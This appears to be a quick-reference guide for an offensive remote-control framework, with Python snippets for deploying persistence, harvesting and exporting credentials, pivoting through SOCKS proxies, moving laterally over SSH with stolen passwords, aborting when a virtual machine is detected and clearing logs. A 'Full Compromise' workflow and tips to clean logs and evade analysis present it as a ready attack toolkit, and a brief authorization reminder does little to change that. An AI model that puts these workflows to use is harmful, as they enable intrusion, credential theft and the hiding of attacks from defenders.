# Quick Reference Guide - Advanced Features

## 🚀 One-Command Usage

### AI Threat Detection
```python
from advanced_ai_detection import analyze_action

# Analyze any agent action
result = analyze_action('agent_001', {
    'type': 'command',
    'command': 'mimikatz.exe',
    'privilege': 'admin'
})

print(f"Risk: {result['risk_score']}/100 - {result['threat_level']}")
```

### Encrypted Communication
```python
from advanced_crypto_channel import AdvancedCryptoChannel

# Controller setup
crypto = AdvancedCryptoChannel(role='controller')
encrypted = crypto.encrypt_message("whoami", 'agent_001')
```

### Persistence Deployment
```python
from advanced_persistence import AdvancedPersistenceManager

# Deploy all persistence methods
manager = AdvancedPersistenceManager(obfuscate=True)
results = manager.install_all_methods()
print(f"Installed {results['successful_count']} methods")
```

### Network Pivoting
```python
from advanced_network_pivoting import AdvancedNetworkPivot

# Start SOCKS5 proxy
pivot = AdvancedNetworkPivot(bind_port=1080)
pivot.start_socks_proxy()

# Add port forward
pivot.add_port_forward(8080, 'internal.server', 80)
```

### Credential Harvesting
```python
from advanced_credential_harvester import AdvancedCredentialHarvester

# Harvest all credentials
harvester = AdvancedCredentialHarvester()
results = harvester.harvest_all()
harvester.export_credentials('creds.json')
```

### Stealth & Evasion
```python
from advanced_stealth_evasion import AdvancedStealthManager

# Enable all stealth features
stealth = AdvancedStealthManager()
stealth.enable_full_stealth()

# Check for VM
vm_check = stealth.check_virtualization()
if vm_check['is_virtual_machine']:
    print("⚠️ Running in VM - abort!")
```

## 📊 Command Cheat Sheet

| Feature | Command | Output |
|---------|---------|--------|
| Test AI Detection | `python advanced_ai_detection.py` | Demo threat analysis |
| Test Encryption | `python advanced_crypto_channel.py` | Demo encrypted session |
| Test Persistence | `python advanced_persistence.py` | Install persistence |
| Test Pivoting | `python advanced_network_pivoting.py` | Start SOCKS proxy |
| Test Credentials | `python advanced_credential_harvester.py` | Harvest creds |
| Test Stealth | `python advanced_stealth_evasion.py` | Enable evasion |
| Full Dashboard | `python advanced_dashboard_integration.py` | Test all features |

## 🎯 Common Workflows

### Workflow 1: Full Compromise
```python
from advanced_dashboard_integration import AdvancedDashboardIntegration

dashboard = AdvancedDashboardIntegration()
dashboard.initialize_modules()

# 1. Establish encrypted channel
dashboard.establish_encrypted_channel('agent_001')

# 2. Deploy persistence
dashboard.deploy_persistence('agent_001')

# 3. Create pivot
dashboard.create_network_pivot('agent_001')

# 4. Monitor with AI
assessment = dashboard.analyze_agent_action('agent_001', action_data)
```

### Workflow 2: Stealth Operation
```python
from advanced_stealth_evasion import AdvancedStealthManager

stealth = AdvancedStealthManager()

# 1. Check environment
vm_check = stealth.check_virtualization()
if vm_check['is_virtual_machine']:
    exit()

# 2. Enable stealth
stealth.enable_full_stealth()

# 3. Clean logs
stealth.clean_logs()

# 4. Proceed with operations...
```

### Workflow 3: Credential Gathering
```python
from advanced_credential_harvester import AdvancedCredentialHarvester
from advanced_network_pivoting import LateralMovementManager

# 1. Harvest local credentials
harvester = AdvancedCredentialHarvester()
creds = harvester.harvest_all()

# 2. Use for lateral movement
lateral = LateralMovementManager()
for cred in creds['methods']['ssh']:
    lateral.attempt_ssh(target_host, cred['username'], cred['password'], 'whoami')
```

## 🔥 Advanced Integrations

### Integration with Controller
```python
# In controller.py, add:
from advanced_dashboard_integration import AdvancedDashboardIntegration, register_advanced_routes

# After socketio init
dashboard = AdvancedDashboardIntegration(socketio)
dashboard.initialize_modules()

# Register routes
register_advanced_routes(app, socketio, dashboard)

# In command handler
@socketio.on('execute_command')
def handle_command(data):
    # Analyze with AI first
    assessment = dashboard.analyze_agent_action(
        data['agent_id'], 
        {'type': 'command', 'command': data['command']}
    )
    
    if assessment['risk_score'] > 80:
        emit('threat_warning', assessment)
```

### Integration with Agent
```python
# In main.py (agent), add:
from advanced_crypto_channel import AdvancedCryptoChannel
from advanced_stealth_evasion import AdvancedStealthManager

# Initialize on startup
crypto = AdvancedCryptoChannel(role='agent')
stealth = AdvancedStealthManager()

# Enable stealth
stealth.enable_full_stealth()

# Use encrypted communication
@socketio.on('encrypted_command')
def handle_encrypted(data):
    decrypted = crypto.decrypt_message(data['package'], 'controller')
    # Execute command...
```

## 📈 Performance Tips

1. **AI Detection:** Requires 50+ actions for ML training
2. **Encryption:** ChaCha20 faster than AES on non-AES-NI CPUs
3. **Persistence:** Test on VM before production
4. **Pivoting:** Use connection pooling for better performance
5. **Credentials:** Browser credential extraction may trigger AV

## ⚠️ Security Warnings

- Always obtain proper authorization
- Test in isolated environments first
- Use strong encryption for exported data
- Clean up after testing
- Monitor for detection

## 🐛 Troubleshooting

**AI Detection not working:**
```bash
pip install scikit-learn pandas numpy
```

**Encryption errors:**
```bash
pip install cryptography>=41.0.0
```

**Permission denied:**
```bash
# Windows: Run as Administrator
# Linux/macOS: Use sudo
```

**Module import errors:**
```bash
# Ensure all files in same directory
# Check Python version (3.8+)
```

## 📚 Documentation Links

- **Full Guide:** [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md)
- **Security:** [SECURITY.md](SECURITY.md)
- **Changes:** [CHANGES.md](CHANGES.md)
- **Main README:** [README.md](README.md)

## 💡 Pro Tips

1. **Chain features** for maximum impact
2. **Always check VM** before deploying
3. **Use encrypted channels** for sensitive commands
4. **Export threat intelligence** for analysis
5. **Clean logs** after operations
6. **Test persistence** in safe environment
7. **Monitor AI scores** to tune sensitivity

## 🎓 Learn More

Each module has standalone `__main__` for testing:
```bash
python advanced_ai_detection.py
python advanced_crypto_channel.py
python advanced_persistence.py
# ... etc
```

View source code for detailed implementation and customization options.

---

**Version:** 3.0 Advanced Edition  
**Last Updated:** 2024  
**Status:** Production Ready
